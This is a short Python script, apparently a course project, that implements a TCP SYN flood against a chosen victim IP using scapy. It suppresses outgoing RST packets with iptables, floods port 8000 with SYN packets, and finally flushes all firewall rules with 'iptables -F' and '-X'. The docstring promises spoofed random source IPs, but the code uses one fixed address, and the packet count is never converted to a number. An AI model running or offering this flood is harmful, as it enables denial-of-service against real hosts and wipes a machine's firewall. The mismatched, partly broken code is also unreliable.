#!/usr/bin/python
"""
This is an implementation of a Syn flood attack
as part of a final project of 'Cyber security defense of network based
environments' course.
the attacker send a flood of TCP Syn messages for different spoofed source ip's
execute: python syn_flood.py victim_ip count_of_syn_packets
Authors: Alex Stoliar & Hen Mevashev
"""
import os

from scapy import route
from scapy.layers.inet import TCP, IP, send
import random
import argparse


def main():
    """
    :return: void
    """
    os.system("sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s "
              "192.168.1.11 -j DROP")
    parser = argparse.ArgumentParser()
    parser.add_argument('victim_ip', help="Victim IP")
    parser.add_argument('count', help="Number of packets to send")
    args = parser.parse_args()
    dst_port = 8000
    i = 0
    while i <= args.count:
        ip_layer = IP(src='192.168.1.11', dst=args.victim_ip)
        tcp = TCP(sport=random.randrange(1000, 40000, 1),
                  dport=dst_port, seq=100, flags='S')
        syn_pkg = ip_layer / tcp
        syn_pkg.show()
        send(syn_pkg)
        i += 1
    os.system('iptables -F')
    os.system('iptables -X')

if __name__ == '__main__':
    main()
